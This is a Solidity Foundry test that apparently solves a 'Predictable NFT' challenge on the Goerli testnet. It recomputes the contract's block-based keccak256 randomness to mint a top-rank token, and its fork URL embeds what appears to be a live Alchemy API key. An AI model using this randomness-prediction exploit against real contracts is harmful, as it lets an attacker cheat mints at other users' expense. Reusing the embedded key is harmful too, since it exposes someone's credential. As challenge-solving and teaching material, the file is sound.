// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface INFT {
    function mint() external payable;
    function tokens(uint256 _id) external view returns (uint256);
    function id() external view returns (uint256);
}

contract PredictableNFTTest is Test {
    INFT nft;
    address hacker = address(0x1337);

    function setUp() public {
        vm.createSelectFork("https://eth-goerli.g.alchemy.com/v2/hYzBWBQ_DPMO4Lo9M6sqeCNRjZw38mS8");
        vm.deal(hacker, 1 ether);
        nft = INFT(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
    }

    function testNft() public {
        vm.startPrank(hacker);
        uint256 mintedId;
        uint256 currentBlockNum = block.number;
        // console.log(msg.sender);
        // console.log(address(hacker));
        mintedId = nft.id();
        // console.log(mintedId);
        // Mint a Superior one, and do it within the next 100 blocks.
        for (uint256 i = 0; i < 100; i++) {
            vm.roll(currentBlockNum);
            // ---- hacking time ----
            uint256 jadu = uint256(keccak256(abi.encode(mintedId + 1, address(hacker), block.number)));
            if (jadu % 100 > 90) {
                //console.log(mintedId);
                //console.log(address(hacker));
                //console.log(block.number);
                //console.log(jadu);
                nft.mint{value: 1 ether}();
                console.log("Minted ID: ", nft.id());
                console.log("Minted Rank: ", nft.tokens(nft.id()));
                break;
            }
            currentBlockNum++;
        }
        // get rank from `mapping(tokenId => rank)`
        // (, bytes memory ret) = nft.call(
        //     abi.encodeWithSignature("tokens(uint256)", mintedId)
        // );
        // uint mintedRank = uint(bytes32(ret));
        mintedId = nft.id();
        uint256 mintedRank = nft.tokens(mintedId);
        assertEq(mintedRank, 3, "not Superior(rank != 3)");
    }
}
